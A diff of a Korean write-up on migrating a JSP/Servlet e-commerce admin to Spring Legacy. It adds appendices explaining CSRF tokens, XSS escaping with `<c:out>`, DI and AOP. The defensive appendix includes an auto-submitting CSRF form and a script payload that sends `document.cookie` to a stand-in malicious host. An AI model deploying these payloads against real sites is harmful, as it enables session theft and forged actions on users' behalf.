@@ -24,6 +24,12 @@ JSP/Servlet 프로젝트를 Spring Legacy(Spring MVC 5.0 + MyBatis + Tiles + Spr
 
 **39개 서블릿 전부 이전 완료**
 
+![판매자 서블릿](capture/scm/vendor_servlet.png)
+
+![관리자 서블릿](capture/scm/admin_servlet.png)
+
+
+
 ---
 
 ## 2. 전체 구조 비교
@@ -54,6 +60,8 @@ JSP/Servlet 프로젝트를 Spring Legacy(Spring MVC 5.0 + MyBatis + Tiles + Spr
 | Security | `security` | `AdminLoginSuccessHandler` |
 
 ---
+
+![Tiles.xml](capture/scm/tiles.png)
 
 ## 3. 전환 패턴 ① Servlet → Controller
 
@@ -361,25 +369,18 @@ public class ActionLogAspect {
 
 ---
 
-## 16. 남은 과제
+## 16. Spring Legacy로 옮겨서 좋아진 점
 
-| 과제 | 내용 |
-|---|---|
-| 판매자 로그인 확인 통합 | `VendorController`에 로그인 확인이 22곳 반복 → Interceptor 또는 관리자처럼 Spring Security로 |
-| 판매자 정지 즉시 반영 | 지금은 정지돼도 다시 로그인하기 전까지 세션이 유지됨 |
-| 업로드 용량 제한 | `multipartResolver` 전체 한도(현재 무제한) + 초과 시 안내 메시지 |
-| 없는 기능 | 상품 수정, 판매자 아이디/비밀번호 찾기 |
-| 배포 문서 | 실제 서버 경로(`/root/goodpang-uploads`)로 문서 갱신, 배포 스크립트에 `ROOT.xml` 자동 생성 |
+| 구분 | 기존 GoodPang | Spring Legacy 전환 후 |
+|---|---|---|
+| 코드 구조 | 서블릿 39개에 요청 처리·DB·트랜잭션이 섞여 있음 | Controller / Service / Mapper로 **역할 분리**, 의존성은 주입받음 |
+| DB 접근 | 연결·파라미터·결과 매핑을 JDBC로 직접 작성 | MyBatis XML에 **SQL만** 작성, 매핑 자동, 동적 SQL로 검색 조건 처리 |
+| 화면 | JSP마다 헤더/사이드바 include 반복 | Tiles 레이아웃 **한 곳**에서 조립, 스크립틀릿 → EL/JSTL |
+| 트랜잭션 | `commit` / `rollback` 직접 제어 (탈퇴 처리는 묶이지 않음) | `@Transactional` 선언만으로 묶음, 예외 시 자동 rollback |
+| 인증/보안 | Filter로 로그인 확인, CSRF 보호 없음 | 관리자는 **Spring Security**(SQL 2개로 인증), 전체 POST에 **CSRF** 토큰, `<c:out>`으로 XSS 방지 |
+| 공통 기능 | 액션 로그 코드가 13곳에 복사 | **AOP** Aspect 한 곳, 성공했을 때만 commit 뒤에 기록 |
 
----
-
-## 17. 배운 점
-
-1. **"동작하던 코드를 옮기는 것"도 설계다** - Servlet 1개를 Controller 메서드로 옮길 때마다 Controller / Service / Mapper 중 어디에 둘지 결정해야 했음
-2. **Spring은 편한 만큼 "보이지 않는 동작"을 알아야 한다** - 확장자로 응답 형식 결정(406), CSRF 필터(403), 프록시 기반 트랜잭션·AOP(설정 위치, 같은 클래스 호출 제약)
-3. **include 방식 차이 같은 작은 차이가 컴파일 오류로 이어진다** - 정적 include vs Tiles 동적 include
-4. **로그와 증상을 먼저 본다** - 406/403/404, `NotReadablePropertyException`, 서버의 폴더 경로 비교가 원인을 바로 알려줌
-5. **수업 예제를 실제 프로젝트에 적용** - SL14(Security JDBC 인증), SL06(AOP)을 그대로 응용
+**요약**: 반복 코드(JDBC·트랜잭션·로그·레이아웃)를 Spring이 맡으면서 각 코드는 **자기 역할에만 집중**하게 됐고, 보안과 데이터 정합성도 함께 개선됨
 
 ---
 
@@ -387,3 +388,180 @@ public class ActionLogAspect {
 
 - 참고 문서: [`docs/goodpanglegacy_scm.md`](goodpanglegacy_scm.md) (AOP 액션 로그 상세)
 - 배포 문서: [`cicd/cicd_springlegacy.md`](../cicd/cicd_springlegacy.md)
+
+---
+
+## 부록. CSRF 토큰과 XSS 방지
+
+### CSRF (Cross-Site Request Forgery, 사이트 간 요청 위조)
+
+**어떤 공격인가** - 사용자가 로그인한 상태를 악용해서, **사용자 모르게 다른 사이트에서 요청을 보내는 공격**
+
+1. 판매자가 GoodPang 판매자센터에 로그인해 있음 (세션 쿠키가 브라우저에 있음)
+2. 같은 브라우저로 악성 사이트에 들어감
+3. 그 사이트에 숨겨진 폼이 있음
+   ```html
+   <form action="https://goodpang.com/vendor/withdraw.htm" method="POST">...</form>
+   <script>document.forms[0].submit();</script>
+   ```
+4. 브라우저는 GoodPang 쿠키를 **자동으로 같이 보냄** → 서버는 판매자 본인의 요청으로 알고 탈퇴를 처리함
+
+기존 GoodPang은 세션만 확인했기 때문에 이런 요청을 막지 못했음
+
+**CSRF 토큰으로 막는 원리**
+- 서버가 화면을 보여줄 때 **예측할 수 없는 난수 토큰**을 폼 안에 같이 넣음
+- POST 요청이 오면 Spring Security의 `CsrfFilter`가 이 토큰이 세션에 저장된 값과 같은지 확인
+- 악성 사이트는 그 토큰 값을 알 수 없음 → 토큰이 없거나 틀리면 **403 Forbidden**
+
+```jsp
+<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}">
+```
+
+- 전환 초기에 "로그인·등록 버튼을 누르면 403"이 난 이유: Security를 켜면 CSRF 보호가 기본으로 켜지는데 폼에 토큰이 없었음
+- 폼 종류별 방법: 일반 form은 hidden input / 파일 첨부 form은 action URL에 토큰 / `fetch()`는 요청 헤더에 토큰
+
+### XSS (Cross-Site Scripting)
+
+**어떤 공격인가** - **사용자가 입력한 값에 스크립트를 넣어서, 그 값을 보는 다른 사람의 브라우저에서 실행시키는 공격**
+
+1. 판매자가 스토어명을 `<script>fetch('https://악성.com?c='+document.cookie)</script>` 로 입점 신청
+2. 관리자가 판매자 승인 화면을 엶
+3. 기존 JSP가 `${seller.storeName}` 이나 `<%= ... %>` 로 **그대로 출력**
+4. 관리자 브라우저에서 스크립트가 실행되고, 관리자 세션 쿠키가 탈취될 수 있음
+
+**`<c:out>`으로 막는 원리** - 출력하기 전에 HTML 특수문자를 **이스케이프**
+
+| 문자 | 변환 |
+|---|---|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&#034;` |
+| `'` | `&#039;` |
+| `&` | `&amp;` |
+
+```jsp
+<%-- 위험: 태그로 해석되어 실행됨 --%>
+${seller.storeName}
+
+<%-- 안전: 화면에 글자 "<script>..." 그대로 보일 뿐 실행 안 됨 --%>
+<c:out value="${seller.storeName}" />
+```
+
+### 한 줄 비교
+
+| | CSRF | XSS |
+|---|---|---|
+| 공격 방법 | 로그인된 사용자의 권한으로 **요청을 위조** | 사용자 입력에 **스크립트를 심음** |
+| 공격 위치 | 다른(악성) 사이트 | 우리 사이트 화면 안 |
+| 방어 | 폼마다 **CSRF 토큰** → 서버가 검증 | 출력할 때 **이스케이프** (`<c:out>`) |
+| 이번 프로젝트 | Spring Security `CsrfFilter` + 모든 POST 폼에 토큰 | 사용자 입력값 출력을 `<c:out>`으로 변경 |
+
+---
+
+## 부록. DI와 AOP는 어디에서 사용되었나
+
+### DI (의존성 주입)
+
+**핵심**: 객체를 `new`로 직접 만들지 않고 Spring이 만들어서 넣어줌
+
+**① 빈 등록: 누가 객체를 만드는가**
+
+| 설정 | 등록되는 빈 |
+|---|---|
+| [root-context.xml](../project/GoodPangSpringLegacy/src/main/webapp/WEB-INF/spring/root-context.xml) `<context:component-scan>` (Controller 제외) | `@Service`, `@Component`(Aspect) |
+| [servlet-context.xml](../project/GoodPangSpringLegacy/src/main/webapp/WEB-INF/spring/appServlet/servlet-context.xml) `<context:component-scan>` (Controller만) | `@Controller` |
+| root-context.xml `<mybatis-spring:scan>` | Mapper 인터페이스 (MyBatis가 구현체를 만들어서 빈으로 등록) |
+| [security-context.xml](../project/GoodPangSpringLegacy/src/main/webapp/WEB-INF/spring/security-context.xml) `<beans:bean>` | `adminSecurityContextRepository`, `adminLoginSuccessHandler`, `passwordEncoder` |
+
+
+![root-context](capture/scm/root-context.png)
+![servlet-context](capture/scm/servlet-context.png)
+
+
+**② 주입: 어디서 받아 쓰는가**
+
+생성자 주입(`@RequiredArgsConstructor` + `private final`) - 이번 파트의 기본 방식
+
+| 클래스 | 주입받는 것 |
+|---|---|
+| `VendorController` | Mapper 6개 + `VendorOrderService`, `VendorProductService`, `VendorAccountService` |
+| `AdminController` | Mapper 6개 + `AdminService`, `AdminDeliveryService` |
+| `VendorOrderService` 외 Service 4개 | 각자 필요한 Mapper |
+| `ActionLogAspect` | `VendorActionLogMapper`, `AdminActionLogMapper` |
+
+```java
+@Controller
+@RequiredArgsConstructor           // final 필드를 받는 생성자를 Lombok이 만들어 줌
+public class VendorController {
+    private final VendorOrderService vendorOrderService;   // Spring이 생성자로 넣어줌
+```
+
+XML 생성자 주입(`<constructor-arg>`) - `AdminLoginSuccessHandler`는 Security 설정 XML에서 빈으로 만들고 `adminMapper`를 생성자로 받음
+```xml
+<beans:bean id="adminLoginSuccessHandler" class="org.doit.goodpang.security.AdminLoginSuccessHandler">
+    <beans:constructor-arg ref="adminMapper" />
+</beans:bean>
+```
+
+ref 주입 - `<http>`의 `authentication-success-handler-ref`, `security-context-repository-ref`, `authentication-manager-ref`로 위 빈들을 연결
+
+**기존과 비교**
+```java
+// Before (GoodPang)
+List<...> list = new VendorDeliveryDAO().findShippingBySellerNo(sellerNo);
+// After
+private final VendorOrderMapper vendorOrderMapper;   // 주입받아서 사용
+```
+- 구현체를 몰라도 됨 - Mapper는 인터페이스뿐, 구현체는 MyBatis가 만듦
+- 객체가 **하나(싱글톤)**만 만들어져 재사용됨
+- 테스트할 때 가짜 Mapper를 넣을 수 있음 (12번 AOP 검증을 가짜 Mapper로 한 것이 이 덕분)
+
+### AOP (관점 지향 프로그래밍)
+
+**핵심**: 여러 곳에 흩어진 공통 기능을 한 곳에 모아서, 원래 코드를 고치지 않고 끼워 넣음
+
+**① 직접 만든 Aspect: 액션 로그 (`ActionLogAspect`)** - 설정은 root-context.xml의 `<aop:aspectj-autoproxy />` 한 줄
+
+| AOP 용어 | 이 프로젝트에서 |
+|---|---|
+| Aspect | `ActionLogAspect` (`@Aspect @Component @Order(1)`) |
+| Pointcut (어디에) | Service 메서드 13개, 예: `VendorProductService.changeDisplayYn(..)` |
+| Advice (언제) | `@AfterReturning` - 예외 없이 끝났을 때만 실행 |
+| 하는 일 | 반환값으로 성공 여부 확인 후 `VENDOR_ACTION_LOG` / `ADMIN_ACTION_LOG`에 기록 |
+
+| 판매자 로그 (7종) | 관리자 로그 (6종) |
+|---|---|
+| 상품 등록 `registerProduct` | 공지 등록 `registerNotice` |
+| 상품 노출/숨김 `changeDisplayYn` | 공지 수정 `updateNotice` |
+| 판매 상태 변경 `changeSaleStatus` | 공지 삭제 `deleteNotice` |
+| 옵션 수정 `updateOption` | 상품 승인/반려 `decideProductApproval` |
+| 출고 처리 `shipOrder` | 판매자 승인/정지 `changeSellerStatus` |
+| 탈퇴 `withdraw` | 배송완료 `completeDelivery` (관리자 로그 + 판매자 로그) |
+
+→ 기존엔 Controller 13곳에 같은 `try { insertLog(...) } catch` 코드, 지금은 Controller가 **Service 호출만** 하고 로그는 Aspect가 처리
+
+**② Spring이 제공하는 AOP: `@Transactional`** - 내부적으로 **AOP 프록시**로 동작 (메서드 앞에서 트랜잭션 시작 → 끝나면 commit, 예외면 rollback)
+
+| 위치 | 메서드 |
+|---|---|
+| `VendorOrderService` | `shipOrder` (ORDERS + DELIVERY) |
+| `VendorProductService` | `registerProduct` (PRODUCT + OPTION + IMAGE) |
+| `VendorAccountService` | `withdraw` (SELLER + PRODUCT) |
+| `AdminDeliveryService` | `completeDelivery` (DELIVERY + ORDERS) |
+
+**두 AOP가 같이 걸릴 때의 순서**
+```
+ActionLogAspect (@Order(1), 바깥)
+   └ @Transactional 프록시 (안쪽)
+        └ Service 메서드 → commit
+   └ commit이 끝난 뒤 → @AfterReturning으로 로그 기록
+```
+→ **로그 저장이 실패해도 원래 처리(출고, 등록 등)는 되돌아가지 않음**
+
+### DI와 AOP의 연결
+
+AOP는 **DI 덕분에 동작함**
+- Controller가 주입받는 `VendorProductService`는 실제로는 Spring이 만든 **프록시 객체**
+- 프록시가 트랜잭션·로그를 처리한 뒤 진짜 Service를 호출
+- `new VendorProductService()`로 직접 만들면 프록시를 거치지 않아 로그도 트랜잭션도 동작하지 않음
+- 같은 클래스 안에서 자기 메서드를 호출할 때 AOP가 안 걸리는 것도 같은 이유
